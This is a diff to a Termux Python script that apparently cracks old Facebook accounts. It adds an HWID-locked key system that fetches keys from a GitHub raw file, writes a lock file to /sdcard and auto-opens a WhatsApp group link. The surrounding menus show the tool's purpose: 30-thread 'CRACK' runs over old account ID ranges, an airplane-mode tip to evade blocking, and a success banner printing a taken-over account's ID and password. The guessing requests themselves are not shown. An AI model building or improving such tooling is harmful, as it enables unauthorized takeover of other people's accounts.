@@ -145,28 +145,70 @@ def creationyear(uid):
     elif len(uid) == 14 and uid.startswith('61'): return '2024'
     else: return ''
 
-# Password & YouTube Approval Lock System with Automatic WhatsApp Redirect
+def get_hwid():
+    try:
+        node = str(uuid.getnode())
+        system_info = platform.platform()
+        hwid_string = f"{node}-{system_info}"
+        hwid = hashlib.sha256(hwid_string.encode()).hexdigest()[:16]
+        return hwid
+    except:
+        return str(uuid.uuid4())[:16]
+
+# Online Key Verification & Device HWID Locking System
 def check_key():
     os.system("clear" if os.name == "posix" else "cls")
     ____banner____()
     
-    # Automatically open WhatsApp group link when password option appears
+    hwid = get_hwid()
+    lock_file = "/sdcard/.rajavau_hwid.txt"
+    
+    saved_key = ""
+    if os.path.exists(lock_file):
+        try:
+            with open(lock_file, "r") as f:
+                content = f.read().split("|")
+                if len(content) == 2 and content[1].strip() == hwid:
+                    saved_key = content[0].strip()
+        except:
+            pass
+
+    # Fetch keys from GitHub raw link
+    key_url = "https://raw.githubusercontent.com/rajavau379-pixel/Kamal-Raja/refs/heads/main/keys.txt"
+    try:
+        response = requests.get(key_url, timeout=10)
+        valid_keys = [k.strip() for k in response.text.splitlines() if k.strip() and not k.startswith("#")]
+    except:
+        valid_keys = []
+
+    if saved_key and saved_key in valid_keys:
+        print(f"\033[1;32m[✓] Device Already Approved & Key Verified!\033[0m")
+        time.sleep(1.5)
+        return True
+
+    # Automatically open WhatsApp group link
     whatsapp_link = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
     os.system(f"am start -a android.intent.action.VIEW -d '{whatsapp_link}' >/dev/null 2>&1 || termux-open-url '{whatsapp_link}'")
     time.sleep(1.5)
 
     linex()
-    print("\033[1;31mWelcome Raja Vau Teach World\033[0m")
-    print("\033[1;33m[+] USERNAME : RAJA VAU TEACH WORLD\033[0m")
-    print("\033[1;31m[!] Please contact admin on WhatsApp for password\033[0m")
+    print("\033[1;31mWelcome Raja Vau Teach World - Key System\033[0m")
+    print(f"\033[1;33m[+] YOUR HWID : {hwid}\033[0m")
+    print("\033[1;31m[!] Please send this HWID to admin on WhatsApp for your Key\033[0m")
     linex()
     
-    user_pass = input("\033[1;36m[?] Enter Password : \033[1;32m").strip()
+    user_key = input("\033[1;36m[?] Enter Your Key : \033[1;32m").strip()
     
-    if user_pass.lower() in ["kamal✅", "kamal"]:
+    if user_key in valid_keys:
+        try:
+            with open(lock_file, "w") as f:
+                f.write(f"{user_key}|{hwid}")
+        except:
+            pass
+
         os.system("clear" if os.name == "posix" else "cls")
         print("\n\033[1;32m┌──────────────────────────────────────────────────────────┐")
-        print("║ \033[1;93m[🔥] Welcome You're Key Is Approved [🔥]\033[1;32m                  ║")
+        print("║ \033[1;93m[🔥] Key Approved & Device Locked Successfully [🔥]\033[1;32m      ║")
         print("└──────────────────────────────────────────────────────────┘\033[0m\n")
         time.sleep(2)
         
@@ -180,8 +222,9 @@ def check_key():
         input("\033[1;33m[?] Have you subscribed to the channel? Press Enter to continue...\033[0m")
         return True
     else:
-        print("\n\033[1;31m[×] WRONG PASSWORD! ACCESS DENIED.\033[0m")
-        time.sleep(2)
+        print("\n\033[1;31m[×] INVALID KEY OR ACCESS DENIED!\033[0m")
+        print(f"\033[1;33mYour Device HWID: {hwid}\033[0m")
+        time.sleep(3)
         sys.exit()
 
 def main_menu():
@@ -252,7 +295,7 @@ def old_Tow():
     user = []
     ____banner____()
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
     linex()
     ____banner____()
     print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
@@ -300,11 +343,11 @@ def old_Tree():
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD A')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMethod B')
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -433,7 +476,7 @@ def login_2(uid):
 \033[1;32m┌──────────────────────────────────────────────────────────┐
 ║ \033[1;93m[🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥]\033[1;32m   ║
 ├──────────────────────────────────────────────────────────┤
-║ \033[1;37mName     : \033[1;96mCLONED ACCOUNT
+║ \033[1;37mName     : \033[1;96mCLON_ED ACCOUNT
 ║ \033[1;95mGmail    : \033[1;95m{uid}@facebook.com
 ║ \033[1;37mLink     : \033[1;94mhttps://www.facebook.com/{uid}
 ║ \033[1;37mPassword : \033[1;92m{pw}
